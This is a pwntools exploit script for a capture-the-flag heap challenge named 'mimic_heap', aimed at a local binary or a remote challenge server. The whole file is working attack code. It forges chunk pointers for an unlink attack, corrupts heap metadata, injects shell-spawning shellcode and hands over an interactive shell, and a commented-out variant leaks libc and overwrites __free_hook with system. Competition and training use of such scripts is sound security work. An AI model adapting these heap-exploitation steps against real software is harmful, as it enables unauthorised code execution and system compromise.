#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./mimic_heap')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./mimic_heap')
			libc1=ELF('./libc-2.27.so')
			libc2=ELF('./libc-2.23.so')
			# libc2 = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('nc.eonew.cn',10009)
			elf=ELF('./mimic_heap')
			libc1=ELF('./libc-2.27.so')
			libc2=ELF('./libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a,b):
			io.sendlineafter('Your choice:','1')
			io.sendlineafter('The size: ',str(a))
			io.sendafter('Content: ',b)

		def edit(a,b):
			io.sendlineafter('Your choice:','3')
			io.sendlineafter('want to modify:',str(a))
			io.sendafter('Content: ',b)

		def show(a):
			io.sendlineafter('Your choice:','4')
			io.sendlineafter('want to see: ',str(a))

		def delete(a):
			io.sendlineafter('Your choice:','2')
			io.sendlineafter('u want to delete: ',str(a))


		add(0xa0,'aaaa')
		delete(0)
		add(0x40,'aaaa')
		add(0x40,'aaaa')
		add(0x48,'aaaa')
		for i in range(8):
			add(0xf8,'aaaa')
		for i in range (7):
			delete(i+4)

		ptr=0xabc028
		fd=ptr-0x18
		bk=ptr-0x10
		edit(2,p64(0)+p64(0x41)+p64(fd)+p64(bk)+'\x00'*0x20+p64(0x40))
		add(0x20,'aaaa')
		delete(3)
		pay=[
		0x1000,0xabc000
		]
		edit(2,flat(pay))
		pay=[
		0,0x101,
		0,0,
		0x100,0xabc010,
		0x100,0xabc010,
		0x100,0xabc000
		]
		edit(1,flat(pay).ljust(0x100,'\x00')+p64(0)+p64(0x21)+p64(0)+p64(0x21)+p64(0)+p64(0xab1)+asm(shellcraft.sh()))
		delete(2)
		shell_addr=0xabc130
		edit(3,p64(0x100))
		edit(1,'\x00'*0x10+p64(shell_addr)+'\x00'*0x18+p64(shell_addr))

		# if heap_base&0xfff == 0 :
		# 	libc=libc2
		# else:
		# 	libc=libc1
		# pay=[
		# heap_base+0xc0
		# ]
		# edit(1,flat(pay)+'\x90')
		# show(0)
		# io.recvuntil('Content: \n')
		# libc_base=(u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10)&0xffffffffffff000
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']
		# pay=[
		# libc.sym['__free_hook'],
		# ]
		# edit(1,flat(pay)+'\x90')
		# edit(0,p64(system_addr))
		# add(0x20,'/bin/sh\x00')
		# delete(3)



		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue